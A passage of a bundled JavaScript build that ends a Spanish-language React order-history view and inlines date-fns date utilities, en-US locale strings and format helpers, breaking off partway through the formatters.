                /* @__PURE__ */ jsx63("span", { className: "font-medium", children: "Color:" }),
                " ",
                order.color
              ] }),
              /* @__PURE__ */ jsxs31("div", { children: [
                /* @__PURE__ */ jsx63("span", { className: "font-medium", children: "Tela:" }),
                " ",
                order.tela
              ] }),
              /* @__PURE__ */ jsxs31("div", { children: [
                /* @__PURE__ */ jsx63("span", { className: "font-medium", children: "Piezas:" }),
                " ",
                order.totalPiezas
              ] }),
              /* @__PURE__ */ jsxs31("div", { children: [
                /* @__PURE__ */ jsx63("span", { className: "font-medium", children: "No. Solicitud:" }),
                " ",
                order.noSolicitud
              ] })
            ] })
          ] }),
          /* @__PURE__ */ jsxs31("div", { className: "text-right", children: [
            /* @__PURE__ */ jsx63("p", { className: "text-sm text-gray-500", children: "Creado" }),
            /* @__PURE__ */ jsx63("p", { className: "text-sm font-medium", children: formatDate(order.createdAt) }),
            order.completedAt && /* @__PURE__ */ jsxs31(Fragment11, { children: [
              /* @__PURE__ */ jsx63("p", { className: "text-sm text-gray-500 mt-2", children: "Finalizado" }),
              /* @__PURE__ */ jsx63("p", { className: "text-sm font-medium", children: formatDate(order.completedAt) })
            ] })
          ] })
        ] }) }, order.id)),
        filteredOrders.length === 0 && /* @__PURE__ */ jsxs31("div", { className: "text-center py-8 text-gray-500", children: [
          /* @__PURE__ */ jsx63(Calendar, { size: 48, className: "mx-auto mb-4 text-gray-300" }),
          /* @__PURE__ */ jsx63("p", { children: "No se encontraron pedidos con los filtros aplicados" })
        ] })
      ] }) })
    ] })
  ] }) });
}

// client/src/pages/agenda-page.tsx
import { useState as useState39, useEffect as useEffect32 } from "react";

// node_modules/react-day-picker/dist/index.esm.js
import { jsx as jsx64, jsxs as jsxs32, Fragment as Fragment12 } from "react/jsx-runtime";
import { createContext as createContext9, useContext as useContext9, useState as useState38, forwardRef as forwardRef38, useEffect as useEffect31, useRef as useRef24, useLayoutEffect as useLayoutEffect6 } from "react";

// node_modules/date-fns/toDate.mjs
function toDate(argument) {
  const argStr = Object.prototype.toString.call(argument);
  if (argument instanceof Date || typeof argument === "object" && argStr === "[object Date]") {
    return new argument.constructor(+argument);
  } else if (typeof argument === "number" || argStr === "[object Number]" || typeof argument === "string" || argStr === "[object String]") {
    return new Date(argument);
  } else {
    return /* @__PURE__ */ new Date(NaN);
  }
}

// node_modules/date-fns/constructFrom.mjs
function constructFrom(date, value) {
  if (date instanceof Date) {
    return new date.constructor(value);
  } else {
    return new Date(value);
  }
}

// node_modules/date-fns/addDays.mjs
function addDays(date, amount) {
  const _date = toDate(date);
  if (isNaN(amount)) return constructFrom(date, NaN);
  if (!amount) {
    return _date;
  }
  _date.setDate(_date.getDate() + amount);
  return _date;
}

// node_modules/date-fns/addMonths.mjs
function addMonths(date, amount) {
  const _date = toDate(date);
  if (isNaN(amount)) return constructFrom(date, NaN);
  if (!amount) {
    return _date;
  }
  const dayOfMonth = _date.getDate();
  const endOfDesiredMonth = constructFrom(date, _date.getTime());
  endOfDesiredMonth.setMonth(_date.getMonth() + amount + 1, 0);
  const daysInMonth = endOfDesiredMonth.getDate();
  if (dayOfMonth >= daysInMonth) {
    return endOfDesiredMonth;
  } else {
    _date.setFullYear(
      endOfDesiredMonth.getFullYear(),
      endOfDesiredMonth.getMonth(),
      dayOfMonth
    );
    return _date;
  }
}

// node_modules/date-fns/constants.mjs
var daysInYear = 365.2425;
var maxTime = Math.pow(10, 8) * 24 * 60 * 60 * 1e3;
var minTime = -maxTime;
var millisecondsInWeek = 6048e5;
var millisecondsInDay = 864e5;
var secondsInHour = 3600;
var secondsInDay = secondsInHour * 24;
var secondsInWeek = secondsInDay * 7;
var secondsInYear = secondsInDay * daysInYear;
var secondsInMonth = secondsInYear / 12;
var secondsInQuarter = secondsInMonth * 3;

// node_modules/date-fns/_lib/defaultOptions.mjs
var defaultOptions2 = {};
function getDefaultOptions() {
  return defaultOptions2;
}

// node_modules/date-fns/startOfWeek.mjs
function startOfWeek(date, options) {
  const defaultOptions3 = getDefaultOptions();
  const weekStartsOn = options?.weekStartsOn ?? options?.locale?.options?.weekStartsOn ?? defaultOptions3.weekStartsOn ?? defaultOptions3.locale?.options?.weekStartsOn ?? 0;
  const _date = toDate(date);
  const day = _date.getDay();
  const diff = (day < weekStartsOn ? 7 : 0) + day - weekStartsOn;
  _date.setDate(_date.getDate() - diff);
  _date.setHours(0, 0, 0, 0);
  return _date;
}

// node_modules/date-fns/startOfISOWeek.mjs
function startOfISOWeek(date) {
  return startOfWeek(date, { weekStartsOn: 1 });
}

// node_modules/date-fns/getISOWeekYear.mjs
function getISOWeekYear(date) {
  const _date = toDate(date);
  const year = _date.getFullYear();
  const fourthOfJanuaryOfNextYear = constructFrom(date, 0);
  fourthOfJanuaryOfNextYear.setFullYear(year + 1, 0, 4);
  fourthOfJanuaryOfNextYear.setHours(0, 0, 0, 0);
  const startOfNextYear = startOfISOWeek(fourthOfJanuaryOfNextYear);
  const fourthOfJanuaryOfThisYear = constructFrom(date, 0);
  fourthOfJanuaryOfThisYear.setFullYear(year, 0, 4);
  fourthOfJanuaryOfThisYear.setHours(0, 0, 0, 0);
  const startOfThisYear = startOfISOWeek(fourthOfJanuaryOfThisYear);
  if (_date.getTime() >= startOfNextYear.getTime()) {
    return year + 1;
  } else if (_date.getTime() >= startOfThisYear.getTime()) {
    return year;
  } else {
    return year - 1;
  }
}

// node_modules/date-fns/startOfDay.mjs
function startOfDay(date) {
  const _date = toDate(date);
  _date.setHours(0, 0, 0, 0);
  return _date;
}

// node_modules/date-fns/_lib/getTimezoneOffsetInMilliseconds.mjs
function getTimezoneOffsetInMilliseconds(date) {
  const _date = toDate(date);
  const utcDate = new Date(
    Date.UTC(
      _date.getFullYear(),
      _date.getMonth(),
      _date.getDate(),
      _date.getHours(),
      _date.getMinutes(),
      _date.getSeconds(),
      _date.getMilliseconds()
    )
  );
  utcDate.setUTCFullYear(_date.getFullYear());
  return +date - +utcDate;
}

// node_modules/date-fns/differenceInCalendarDays.mjs
function differenceInCalendarDays(dateLeft, dateRight) {
  const startOfDayLeft = startOfDay(dateLeft);
  const startOfDayRight = startOfDay(dateRight);
  const timestampLeft = +startOfDayLeft - getTimezoneOffsetInMilliseconds(startOfDayLeft);
  const timestampRight = +startOfDayRight - getTimezoneOffsetInMilliseconds(startOfDayRight);
  return Math.round((timestampLeft - timestampRight) / millisecondsInDay);
}

// node_modules/date-fns/startOfISOWeekYear.mjs
function startOfISOWeekYear(date) {
  const year = getISOWeekYear(date);
  const fourthOfJanuary = constructFrom(date, 0);
  fourthOfJanuary.setFullYear(year, 0, 4);
  fourthOfJanuary.setHours(0, 0, 0, 0);
  return startOfISOWeek(fourthOfJanuary);
}

// node_modules/date-fns/addWeeks.mjs
function addWeeks(date, amount) {
  const days = amount * 7;
  return addDays(date, days);
}

// node_modules/date-fns/addYears.mjs
function addYears(date, amount) {
  return addMonths(date, amount * 12);
}

// node_modules/date-fns/max.mjs
function max2(dates) {
  let result;
  dates.forEach(function(dirtyDate) {
    const currentDate = toDate(dirtyDate);
    if (result === void 0 || result < currentDate || isNaN(Number(currentDate))) {
      result = currentDate;
    }
  });
  return result || /* @__PURE__ */ new Date(NaN);
}

// node_modules/date-fns/min.mjs
function min2(dates) {
  let result;
  dates.forEach((dirtyDate) => {
    const date = toDate(dirtyDate);
    if (!result || result > date || isNaN(+date)) {
      result = date;
    }
  });
  return result || /* @__PURE__ */ new Date(NaN);
}

// node_modules/date-fns/isSameDay.mjs
function isSameDay(dateLeft, dateRight) {
  const dateLeftStartOfDay = startOfDay(dateLeft);
  const dateRightStartOfDay = startOfDay(dateRight);
  return +dateLeftStartOfDay === +dateRightStartOfDay;
}

// node_modules/date-fns/isDate.mjs
function isDate(value) {
  return value instanceof Date || typeof value === "object" && Object.prototype.toString.call(value) === "[object Date]";
}

// node_modules/date-fns/isValid.mjs
function isValid(date) {
  if (!isDate(date) && typeof date !== "number") {
    return false;
  }
  const _date = toDate(date);
  return !isNaN(Number(_date));
}

// node_modules/date-fns/differenceInCalendarMonths.mjs
function differenceInCalendarMonths(dateLeft, dateRight) {
  const _dateLeft = toDate(dateLeft);
  const _dateRight = toDate(dateRight);
  const yearDiff = _dateLeft.getFullYear() - _dateRight.getFullYear();
  const monthDiff = _dateLeft.getMonth() - _dateRight.getMonth();
  return yearDiff * 12 + monthDiff;
}

// node_modules/date-fns/differenceInCalendarWeeks.mjs
function differenceInCalendarWeeks(dateLeft, dateRight, options) {
  const startOfWeekLeft = startOfWeek(dateLeft, options);
  const startOfWeekRight = startOfWeek(dateRight, options);
  const timestampLeft = +startOfWeekLeft - getTimezoneOffsetInMilliseconds(startOfWeekLeft);
  const timestampRight = +startOfWeekRight - getTimezoneOffsetInMilliseconds(startOfWeekRight);
  return Math.round((timestampLeft - timestampRight) / millisecondsInWeek);
}

// node_modules/date-fns/endOfMonth.mjs
function endOfMonth(date) {
  const _date = toDate(date);
  const month = _date.getMonth();
  _date.setFullYear(_date.getFullYear(), month + 1, 0);
  _date.setHours(23, 59, 59, 999);
  return _date;
}

// node_modules/date-fns/startOfMonth.mjs
function startOfMonth(date) {
  const _date = toDate(date);
  _date.setDate(1);
  _date.setHours(0, 0, 0, 0);
  return _date;
}

// node_modules/date-fns/startOfYear.mjs
function startOfYear(date) {
  const cleanDate = toDate(date);
  const _date = constructFrom(date, 0);
  _date.setFullYear(cleanDate.getFullYear(), 0, 1);
  _date.setHours(0, 0, 0, 0);
  return _date;
}

// node_modules/date-fns/endOfWeek.mjs
function endOfWeek(date, options) {
  const defaultOptions3 = getDefaultOptions();
  const weekStartsOn = options?.weekStartsOn ?? options?.locale?.options?.weekStartsOn ?? defaultOptions3.weekStartsOn ?? defaultOptions3.locale?.options?.weekStartsOn ?? 0;
  const _date = toDate(date);
  const day = _date.getDay();
  const diff = (day < weekStartsOn ? -7 : 0) + 6 - (day - weekStartsOn);
  _date.setDate(_date.getDate() + diff);
  _date.setHours(23, 59, 59, 999);
  return _date;
}

// node_modules/date-fns/endOfISOWeek.mjs
function endOfISOWeek(date) {
  return endOfWeek(date, { weekStartsOn: 1 });
}

// node_modules/date-fns/locale/en-US/_lib/formatDistance.mjs
var formatDistanceLocale = {
  lessThanXSeconds: {
    one: "less than a second",
    other: "less than {{count}} seconds"
  },
  xSeconds: {
    one: "1 second",
    other: "{{count}} seconds"
  },
  halfAMinute: "half a minute",
  lessThanXMinutes: {
    one: "less than a minute",
    other: "less than {{count}} minutes"
  },
  xMinutes: {
    one: "1 minute",
    other: "{{count}} minutes"
  },
  aboutXHours: {
    one: "about 1 hour",
    other: "about {{count}} hours"
  },
  xHours: {
    one: "1 hour",
    other: "{{count}} hours"
  },
  xDays: {
    one: "1 day",
    other: "{{count}} days"
  },
  aboutXWeeks: {
    one: "about 1 week",
    other: "about {{count}} weeks"
  },
  xWeeks: {
    one: "1 week",
    other: "{{count}} weeks"
  },
  aboutXMonths: {
    one: "about 1 month",
    other: "about {{count}} months"
  },
  xMonths: {
    one: "1 month",
    other: "{{count}} months"
  },
  aboutXYears: {
    one: "about 1 year",
    other: "about {{count}} years"
  },
  xYears: {
    one: "1 year",
    other: "{{count}} years"
  },
  overXYears: {
    one: "over 1 year",
    other: "over {{count}} years"
  },
  almostXYears: {
    one: "almost 1 year",
    other: "almost {{count}} years"
  }
};
var formatDistance = (token, count4, options) => {
  let result;
  const tokenValue = formatDistanceLocale[token];
  if (typeof tokenValue === "string") {
    result = tokenValue;
  } else if (count4 === 1) {
    result = tokenValue.one;
  } else {
    result = tokenValue.other.replace("{{count}}", count4.toString());
  }
  if (options?.addSuffix) {
    if (options.comparison && options.comparison > 0) {
      return "in " + result;
    } else {
      return result + " ago";
    }
  }
  return result;
};

// node_modules/date-fns/locale/_lib/buildFormatLongFn.mjs
function buildFormatLongFn(args) {
  return (options = {}) => {
    const width = options.width ? String(options.width) : args.defaultWidth;
    const format2 = args.formats[width] || args.formats[args.defaultWidth];
    return format2;
  };
}

// node_modules/date-fns/locale/en-US/_lib/formatLong.mjs
var dateFormats = {
  full: "EEEE, MMMM do, y",
  long: "MMMM do, y",
  medium: "MMM d, y",
  short: "MM/dd/yyyy"
};
var timeFormats = {
  full: "h:mm:ss a zzzz",
  long: "h:mm:ss a z",
  medium: "h:mm:ss a",
  short: "h:mm a"
};
var dateTimeFormats = {
  full: "{{date}} 'at' {{time}}",
  long: "{{date}} 'at' {{time}}",
  medium: "{{date}}, {{time}}",
  short: "{{date}}, {{time}}"
};
var formatLong = {
  date: buildFormatLongFn({
    formats: dateFormats,
    defaultWidth: "full"
  }),
  time: buildFormatLongFn({
    formats: timeFormats,
    defaultWidth: "full"
  }),
  dateTime: buildFormatLongFn({
    formats: dateTimeFormats,
    defaultWidth: "full"
  })
};

// node_modules/date-fns/locale/en-US/_lib/formatRelative.mjs
var formatRelativeLocale = {
  lastWeek: "'last' eeee 'at' p",
  yesterday: "'yesterday at' p",
  today: "'today at' p",
  tomorrow: "'tomorrow at' p",
  nextWeek: "eeee 'at' p",
  other: "P"
};
var formatRelative = (token, _date, _baseDate, _options) => formatRelativeLocale[token];

// node_modules/date-fns/locale/_lib/buildLocalizeFn.mjs
function buildLocalizeFn(args) {
  return (value, options) => {
    const context = options?.context ? String(options.context) : "standalone";
    let valuesArray;
    if (context === "formatting" && args.formattingValues) {
      const defaultWidth = args.defaultFormattingWidth || args.defaultWidth;
      const width = options?.width ? String(options.width) : defaultWidth;
      valuesArray = args.formattingValues[width] || args.formattingValues[defaultWidth];
    } else {
      const defaultWidth = args.defaultWidth;
      const width = options?.width ? String(options.width) : args.defaultWidth;
      valuesArray = args.values[width] || args.values[defaultWidth];
    }
    const index2 = args.argumentCallback ? args.argumentCallback(value) : value;
    return valuesArray[index2];
  };
}

// node_modules/date-fns/locale/en-US/_lib/localize.mjs
var eraValues = {
  narrow: ["B", "A"],
  abbreviated: ["BC", "AD"],
  wide: ["Before Christ", "Anno Domini"]
};
var quarterValues = {
  narrow: ["1", "2", "3", "4"],
  abbreviated: ["Q1", "Q2", "Q3", "Q4"],
  wide: ["1st quarter", "2nd quarter", "3rd quarter", "4th quarter"]
};
var monthValues = {
  narrow: ["J", "F", "M", "A", "M", "J", "J", "A", "S", "O", "N", "D"],
  abbreviated: [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
  ],
  wide: [
    "January",
    "February",
    "March",
    "April",
    "May",
    "June",
    "July",
    "August",
    "September",
    "October",
    "November",
    "December"
  ]
};
var dayValues = {
  narrow: ["S", "M", "T", "W", "T", "F", "S"],
  short: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],
  abbreviated: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
  wide: [
    "Sunday",
    "Monday",
    "Tuesday",
    "Wednesday",
    "Thursday",
    "Friday",
    "Saturday"
  ]
};
var dayPeriodValues = {
  narrow: {
    am: "a",
    pm: "p",
    midnight: "mi",
    noon: "n",
    morning: "morning",
    afternoon: "afternoon",
    evening: "evening",
    night: "night"
  },
  abbreviated: {
    am: "AM",
    pm: "PM",
    midnight: "midnight",
    noon: "noon",
    morning: "morning",
    afternoon: "afternoon",
    evening: "evening",
    night: "night"
  },
  wide: {
    am: "a.m.",
    pm: "p.m.",
    midnight: "midnight",
    noon: "noon",
    morning: "morning",
    afternoon: "afternoon",
    evening: "evening",
    night: "night"
  }
};
var formattingDayPeriodValues = {
  narrow: {
    am: "a",
    pm: "p",
    midnight: "mi",
    noon: "n",
    morning: "in the morning",
    afternoon: "in the afternoon",
    evening: "in the evening",
    night: "at night"
  },
  abbreviated: {
    am: "AM",
    pm: "PM",
    midnight: "midnight",
    noon: "noon",
    morning: "in the morning",
    afternoon: "in the afternoon",
    evening: "in the evening",
    night: "at night"
  },
  wide: {
    am: "a.m.",
    pm: "p.m.",
    midnight: "midnight",
    noon: "noon",
    morning: "in the morning",
    afternoon: "in the afternoon",
    evening: "in the evening",
    night: "at night"
  }
};
var ordinalNumber = (dirtyNumber, _options) => {
  const number = Number(dirtyNumber);
  const rem100 = number % 100;
  if (rem100 > 20 || rem100 < 10) {
    switch (rem100 % 10) {
      case 1:
        return number + "st";
      case 2:
        return number + "nd";
      case 3:
        return number + "rd";
    }
  }
  return number + "th";
};
var localize = {
  ordinalNumber,
  era: buildLocalizeFn({
    values: eraValues,
    defaultWidth: "wide"
  }),
  quarter: buildLocalizeFn({
    values: quarterValues,
    defaultWidth: "wide",
    argumentCallback: (quarter) => quarter - 1
  }),
  month: buildLocalizeFn({
    values: monthValues,
    defaultWidth: "wide"
  }),
  day: buildLocalizeFn({
    values: dayValues,
    defaultWidth: "wide"
  }),
  dayPeriod: buildLocalizeFn({
    values: dayPeriodValues,
    defaultWidth: "wide",
    formattingValues: formattingDayPeriodValues,
    defaultFormattingWidth: "wide"
  })
};

// node_modules/date-fns/locale/_lib/buildMatchFn.mjs
function buildMatchFn(args) {
  return (string, options = {}) => {
    const width = options.width;
    const matchPattern = width && args.matchPatterns[width] || args.matchPatterns[args.defaultMatchWidth];
    const matchResult = string.match(matchPattern);
    if (!matchResult) {
      return null;
    }
    const matchedString = matchResult[0];
    const parsePatterns = width && args.parsePatterns[width] || args.parsePatterns[args.defaultParseWidth];
    const key = Array.isArray(parsePatterns) ? findIndex(parsePatterns, (pattern) => pattern.test(matchedString)) : (
      // eslint-disable-next-line @typescript-eslint/no-explicit-any -- I challange you to fix the type
      findKey(parsePatterns, (pattern) => pattern.test(matchedString))
    );
    let value;
    value = args.valueCallback ? args.valueCallback(key) : key;
    value = options.valueCallback ? (
      // eslint-disable-next-line @typescript-eslint/no-explicit-any -- I challange you to fix the type
      options.valueCallback(value)
    ) : value;
    const rest = string.slice(matchedString.length);
    return { value, rest };
  };
}
function findKey(object, predicate) {
  for (const key in object) {
    if (Object.prototype.hasOwnProperty.call(object, key) && predicate(object[key])) {
      return key;
    }
  }
  return void 0;
}
function findIndex(array, predicate) {
  for (let key = 0; key < array.length; key++) {
    if (predicate(array[key])) {
      return key;
    }
  }
  return void 0;
}

// node_modules/date-fns/locale/_lib/buildMatchPatternFn.mjs
function buildMatchPatternFn(args) {
  return (string, options = {}) => {
    const matchResult = string.match(args.matchPattern);
    if (!matchResult) return null;
    const matchedString = matchResult[0];
    const parseResult = string.match(args.parsePattern);
    if (!parseResult) return null;
    let value = args.valueCallback ? args.valueCallback(parseResult[0]) : parseResult[0];
    value = options.valueCallback ? options.valueCallback(value) : value;
    const rest = string.slice(matchedString.length);
    return { value, rest };
  };
}

// node_modules/date-fns/locale/en-US/_lib/match.mjs
var matchOrdinalNumberPattern = /^(\d+)(th|st|nd|rd)?/i;
var parseOrdinalNumberPattern = /\d+/i;
var matchEraPatterns = {
  narrow: /^(b|a)/i,
  abbreviated: /^(b\.?\s?c\.?|b\.?\s?c\.?\s?e\.?|a\.?\s?d\.?|c\.?\s?e\.?)/i,
  wide: /^(before christ|before common era|anno domini|common era)/i
};
var parseEraPatterns = {
  any: [/^b/i, /^(a|c)/i]
};
var matchQuarterPatterns = {
  narrow: /^[1234]/i,
  abbreviated: /^q[1234]/i,
  wide: /^[1234](th|st|nd|rd)? quarter/i
};
var parseQuarterPatterns = {
  any: [/1/i, /2/i, /3/i, /4/i]
};
var matchMonthPatterns = {
  narrow: /^[jfmasond]/i,
  abbreviated: /^(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)/i,
  wide: /^(january|february|march|april|may|june|july|august|september|october|november|december)/i
};
var parseMonthPatterns = {
  narrow: [
    /^j/i,
    /^f/i,
    /^m/i,
    /^a/i,
    /^m/i,
    /^j/i,
    /^j/i,
    /^a/i,
    /^s/i,
    /^o/i,
    /^n/i,
    /^d/i
  ],
  any: [
    /^ja/i,
    /^f/i,
    /^mar/i,
    /^ap/i,
    /^may/i,
    /^jun/i,
    /^jul/i,
    /^au/i,
    /^s/i,
    /^o/i,
    /^n/i,
    /^d/i
  ]
};
var matchDayPatterns = {
  narrow: /^[smtwf]/i,
  short: /^(su|mo|tu|we|th|fr|sa)/i,
  abbreviated: /^(sun|mon|tue|wed|thu|fri|sat)/i,
  wide: /^(sunday|monday|tuesday|wednesday|thursday|friday|saturday)/i
};
var parseDayPatterns = {
  narrow: [/^s/i, /^m/i, /^t/i, /^w/i, /^t/i, /^f/i, /^s/i],
  any: [/^su/i, /^m/i, /^tu/i, /^w/i, /^th/i, /^f/i, /^sa/i]
};
var matchDayPeriodPatterns = {
  narrow: /^(a|p|mi|n|(in the|at) (morning|afternoon|evening|night))/i,
  any: /^([ap]\.?\s?m\.?|midnight|noon|(in the|at) (morning|afternoon|evening|night))/i
};
var parseDayPeriodPatterns = {
  any: {
    am: /^a/i,
    pm: /^p/i,
    midnight: /^mi/i,
    noon: /^no/i,
    morning: /morning/i,
    afternoon: /afternoon/i,
    evening: /evening/i,
    night: /night/i
  }
};
var match = {
  ordinalNumber: buildMatchPatternFn({
    matchPattern: matchOrdinalNumberPattern,
    parsePattern: parseOrdinalNumberPattern,
    valueCallback: (value) => parseInt(value, 10)
  }),
  era: buildMatchFn({
    matchPatterns: matchEraPatterns,
    defaultMatchWidth: "wide",
    parsePatterns: parseEraPatterns,
    defaultParseWidth: "any"
  }),
  quarter: buildMatchFn({
    matchPatterns: matchQuarterPatterns,
    defaultMatchWidth: "wide",
    parsePatterns: parseQuarterPatterns,
    defaultParseWidth: "any",
    valueCallback: (index2) => index2 + 1
  }),
  month: buildMatchFn({
    matchPatterns: matchMonthPatterns,
    defaultMatchWidth: "wide",
    parsePatterns: parseMonthPatterns,
    defaultParseWidth: "any"
  }),
  day: buildMatchFn({
    matchPatterns: matchDayPatterns,
    defaultMatchWidth: "wide",
    parsePatterns: parseDayPatterns,
    defaultParseWidth: "any"
  }),
  dayPeriod: buildMatchFn({
    matchPatterns: matchDayPeriodPatterns,
    defaultMatchWidth: "any",
    parsePatterns: parseDayPeriodPatterns,
    defaultParseWidth: "any"
  })
};

// node_modules/date-fns/locale/en-US.mjs
var enUS = {
  code: "en-US",
  formatDistance,
  formatLong,
  formatRelative,
  localize,
  match,
  options: {
    weekStartsOn: 0,
    firstWeekContainsDate: 1
  }
};

// node_modules/date-fns/getDayOfYear.mjs
function getDayOfYear(date) {
  const _date = toDate(date);
  const diff = differenceInCalendarDays(_date, startOfYear(_date));
  const dayOfYear = diff + 1;
  return dayOfYear;
}

// node_modules/date-fns/getISOWeek.mjs
function getISOWeek(date) {
  const _date = toDate(date);
  const diff = +startOfISOWeek(_date) - +startOfISOWeekYear(_date);
  return Math.round(diff / millisecondsInWeek) + 1;
}

// node_modules/date-fns/getWeekYear.mjs
function getWeekYear(date, options) {
  const _date = toDate(date);
  const year = _date.getFullYear();
  const defaultOptions3 = getDefaultOptions();
  const firstWeekContainsDate = options?.firstWeekContainsDate ?? options?.locale?.options?.firstWeekContainsDate ?? defaultOptions3.firstWeekContainsDate ?? defaultOptions3.locale?.options?.firstWeekContainsDate ?? 1;
  const firstWeekOfNextYear = constructFrom(date, 0);
  firstWeekOfNextYear.setFullYear(year + 1, 0, firstWeekContainsDate);
  firstWeekOfNextYear.setHours(0, 0, 0, 0);
  const startOfNextYear = startOfWeek(firstWeekOfNextYear, options);
  const firstWeekOfThisYear = constructFrom(date, 0);
  firstWeekOfThisYear.setFullYear(year, 0, firstWeekContainsDate);
  firstWeekOfThisYear.setHours(0, 0, 0, 0);
  const startOfThisYear = startOfWeek(firstWeekOfThisYear, options);
  if (_date.getTime() >= startOfNextYear.getTime()) {
    return year + 1;
  } else if (_date.getTime() >= startOfThisYear.getTime()) {
    return year;
  } else {
    return year - 1;
  }
}

// node_modules/date-fns/startOfWeekYear.mjs
function startOfWeekYear(date, options) {
  const defaultOptions3 = getDefaultOptions();
  const firstWeekContainsDate = options?.firstWeekContainsDate ?? options?.locale?.options?.firstWeekContainsDate ?? defaultOptions3.firstWeekContainsDate ?? defaultOptions3.locale?.options?.firstWeekContainsDate ?? 1;
  const year = getWeekYear(date, options);
  const firstWeek = constructFrom(date, 0);
  firstWeek.setFullYear(year, 0, firstWeekContainsDate);
  firstWeek.setHours(0, 0, 0, 0);
  const _date = startOfWeek(firstWeek, options);
  return _date;
}

// node_modules/date-fns/getWeek.mjs
function getWeek(date, options) {
  const _date = toDate(date);
  const diff = +startOfWeek(_date, options) - +startOfWeekYear(_date, options);
  return Math.round(diff / millisecondsInWeek) + 1;
}

// node_modules/date-fns/_lib/addLeadingZeros.mjs
function addLeadingZeros(number, targetLength) {
  const sign = number < 0 ? "-" : "";
  const output = Math.abs(number).toString().padStart(targetLength, "0");
  return sign + output;
}

// node_modules/date-fns/_lib/format/lightFormatters.mjs
var lightFormatters = {
  // Year
  y(date, token) {
    const signedYear = date.getFullYear();
    const year = signedYear > 0 ? signedYear : 1 - signedYear;
    return addLeadingZeros(token === "yy" ? year % 100 : year, token.length);
  },
  // Month
  M(date, token) {
    const month = date.getMonth();
    return token === "M" ? String(month + 1) : addLeadingZeros(month + 1, 2);
  },
  // Day of the month
  d(date, token) {
    return addLeadingZeros(date.getDate(), token.length);
  },
  // AM or PM
  a(date, token) {
    const dayPeriodEnumValue = date.getHours() / 12 >= 1 ? "pm" : "am";
    switch (token) {
      case "a":
      case "aa":
        return dayPeriodEnumValue.toUpperCase();
      case "aaa":
        return dayPeriodEnumValue;
      case "aaaaa":
        return dayPeriodEnumValue[0];
      case "aaaa":
      default:
        return dayPeriodEnumValue === "am" ? "a.m." : "p.m.";
    }
  },
  // Hour [1-12]
  h(date, token) {
    return addLeadingZeros(date.getHours() % 12 || 12, token.length);
  },
  // Hour [0-23]
  H(date, token) {
    return addLeadingZeros(date.getHours(), token.length);
  },
  // Minute
  m(date, token) {
    return addLeadingZeros(date.getMinutes(), token.length);
  },
  // Second
  s(date, token) {
    return addLeadingZeros(date.getSeconds(), token.length);
  },
  // Fraction of second
  S(date, token) {
    const numberOfDigits = token.length;
    const milliseconds = date.getMilliseconds();
    const fractionalSeconds = Math.trunc(
      milliseconds * Math.pow(10, numberOfDigits - 3)
    );
    return addLeadingZeros(fractionalSeconds, token.length);
  }
};

// node_modules/date-fns/_lib/format/formatters.mjs
var dayPeriodEnum = {
  am: "am",
  pm: "pm",
  midnight: "midnight",
  noon: "noon",
  morning: "morning",
  afternoon: "afternoon",
  evening: "evening",
  night: "night"
};
var formatters = {
  // Era
  G: function(date, token, localize2) {
    const era = date.getFullYear() > 0 ? 1 : 0;
    switch (token) {
      // AD, BC
      case "G":
      case "GG":
      case "GGG":
        return localize2.era(era, { width: "abbreviated" });
      // A, B
      case "GGGGG":
        return localize2.era(era, { width: "narrow" });
      // Anno Domini, Before Christ
      case "GGGG":
      default:
        return localize2.era(era, { width: "wide" });
    }
  },
  // Year
  y: function(date, token, localize2) {
    if (token === "yo") {
      const signedYear = date.getFullYear();
      const year = signedYear > 0 ? signedYear : 1 - signedYear;
      return localize2.ordinalNumber(year, { unit: "year" });
    }
    return lightFormatters.y(date, token);
  },
  // Local week-numbering year
  Y: function(date, token, localize2, options) {
    const signedWeekYear = getWeekYear(date, options);
    const weekYear = signedWeekYear > 0 ? signedWeekYear : 1 - signedWeekYear;
    if (token === "YY") {
      const twoDigitYear = weekYear % 100;
      return addLeadingZeros(twoDigitYear, 2);
    }
    if (token === "Yo") {
      return localize2.ordinalNumber(weekYear, { unit: "year" });
    }
    return addLeadingZeros(weekYear, token.length);
  },
  // ISO week-numbering year
  R: function(date, token) {
    const isoWeekYear = getISOWeekYear(date);
    return addLeadingZeros(isoWeekYear, token.length);
  },
  // Extended year. This is a single number designating the year of this calendar system.
  // The main difference between `y` and `u` localizers are B.C. years:
  // | Year | `y` | `u` |
  // |------|-----|-----|
  // | AC 1 |   1 |   1 |
  // | BC 1 |   1 |   0 |
  // | BC 2 |   2 |  -1 |
  // Also `yy` always returns the last two digits of a year,
  // while `uu` pads single digit years to 2 characters and returns other years unchanged.
  u: function(date, token) {
    const year = date.getFullYear();
    return addLeadingZeros(year, token.length);
  },
  // Quarter
  Q: function(date, token, localize2) {
    const quarter = Math.ceil((date.getMonth() + 1) / 3);
    switch (token) {
      // 1, 2, 3, 4
      case "Q":
        return String(quarter);
      // 01, 02, 03, 04
      case "QQ":
        return addLeadingZeros(quarter, 2);
      // 1st, 2nd, 3rd, 4th
      case "Qo":
        return localize2.ordinalNumber(quarter, { unit: "quarter" });
      // Q1, Q2, Q3, Q4
      case "QQQ":
        return localize2.quarter(quarter, {
          width: "abbreviated",
          context: "formatting"
        });
      // 1, 2, 3, 4 (narrow quarter; could be not numerical)
      case "QQQQQ":
        return localize2.quarter(quarter, {
          width: "narrow",
          context: "formatting"
        });
      // 1st quarter, 2nd quarter, ...
      case "QQQQ":
      default:
        return localize2.quarter(quarter, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // Stand-alone quarter
  q: function(date, token, localize2) {
    const quarter = Math.ceil((date.getMonth() + 1) / 3);
    switch (token) {
      // 1, 2, 3, 4
      case "q":
        return String(quarter);
      // 01, 02, 03, 04
      case "qq":
        return addLeadingZeros(quarter, 2);
      // 1st, 2nd, 3rd, 4th
      case "qo":
        return localize2.ordinalNumber(quarter, { unit: "quarter" });
      // Q1, Q2, Q3, Q4
      case "qqq":
        return localize2.quarter(quarter, {
          width: "abbreviated",
          context: "standalone"
        });
      // 1, 2, 3, 4 (narrow quarter; could be not numerical)
      case "qqqqq":
        return localize2.quarter(quarter, {
          width: "narrow",
          context: "standalone"
        });
      // 1st quarter, 2nd quarter, ...
      case "qqqq":
      default:
        return localize2.quarter(quarter, {
          width: "wide",
          context: "standalone"
        });
    }
  },
  // Month
